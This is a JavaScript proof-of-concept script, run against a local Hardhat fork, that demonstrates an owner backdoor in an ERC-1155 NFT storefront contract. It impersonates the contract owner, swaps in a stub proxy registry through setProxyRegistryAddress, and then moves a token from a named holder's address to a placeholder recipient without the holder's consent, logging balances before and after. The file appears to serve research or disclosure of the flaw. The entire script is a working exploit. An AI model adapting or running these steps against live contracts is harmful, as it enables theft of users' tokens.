import { ethers } from "ethers";
import fs from "fs";

const provider = new ethers.providers.JsonRpcProvider("http://127.0.0.1:8545/");
const sharedStorefrontAddress = "0x495f947276749ce646f68ac8c248420045cb7b5e";
const aTokenID = "103964089402971035322194754460519211901162239038652937872902470904772294606849";
const tokenOwner = "0x6acdfba02d390b97ac2b2d42a63e85293bcc160e";
const tokenRecipient = "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

// OpenSea shared storefront contract //////////////////////////////////////////////////////////////////////////////////
const sharedStorefrontABI = [
    // Backdoor stuff
    "function owner() view returns (address)",
    "function setProxyRegistryAddress(address proxyRegistryAddress)",

    // ERC-1155 stuff
    "function balanceOf(address _owner, uint256 _id) view returns (uint256)",
    "function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data)",
    "event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value)",
];
const sharedStorefrontReadOnly = new ethers.Contract(sharedStorefrontAddress, sharedStorefrontABI, provider);
const contractOwner = await sharedStorefrontReadOnly.owner();
console.log("Storefront (ERC-1155):", sharedStorefrontAddress);
console.log("Contract backdoor:    ", contractOwner);
console.log("Token ID:             ", aTokenID);
console.log("Token owner:          ", tokenOwner);

// Impersonate contract owner //////////////////////////////////////////////////////////////////////////////////////////
const accountToImpersonate = contractOwner;
await provider.send("hardhat_impersonateAccount", [accountToImpersonate]);
await provider.send("hardhat_setBalance", [accountToImpersonate, "0x1000000000000000000"]);
const signer = provider.getSigner(accountToImpersonate);
const sharedStorefront = sharedStorefrontReadOnly.connect(signer);

// Proxy registry stub /////////////////////////////////////////////////////////////////////////////////////////////////
const proxyRegistryStubABI = JSON.parse(fs.readFileSync("./proxyRegistryStubABI.json"));
const proxyRegistryStubBytecode = JSON.parse(fs.readFileSync("./proxyRegistryStubBytecode.json"));
const proxyRegistryStubFactory = new ethers.ContractFactory(proxyRegistryStubABI, proxyRegistryStubBytecode, signer);
const proxyRegistryStub = await proxyRegistryStubFactory.deploy();
await proxyRegistryStub.deployed();
console.log("Proxy registry stub:  ", proxyRegistryStub.address);
await sharedStorefront.setProxyRegistryAddress(proxyRegistryStub.address, { gasLimit: 1000000 });

// Attempt to transfer token ///////////////////////////////////////////////////////////////////////////////////////////
// Balance before
const senderBalanceBefore = await sharedStorefront.balanceOf(tokenOwner, aTokenID);
console.log("Sender balance:       ", senderBalanceBefore.toString());
const recipientBalanceBefore = await sharedStorefront.balanceOf(tokenRecipient, aTokenID);
console.log("Recipient balance:    ", recipientBalanceBefore.toString());

// Transfer token
const tx = await sharedStorefront.safeTransferFrom(tokenOwner, tokenRecipient, aTokenID, 1, "0x", { gasLimit: 1000000 });
const receipt = await tx.wait();
console.log("Transaction hash:     ", receipt.transactionHash);
console.log("Transaction logs:     ", receipt.logs);

// Balance after
const senderBalanceAfter = await sharedStorefront.balanceOf(tokenOwner, aTokenID);
console.log("Sender balance:       ", senderBalanceAfter.toString());
const recipientBalanceAfter = await sharedStorefront.balanceOf(tokenRecipient, aTokenID);
console.log("Recipient balance:    ", recipientBalanceAfter.toString());
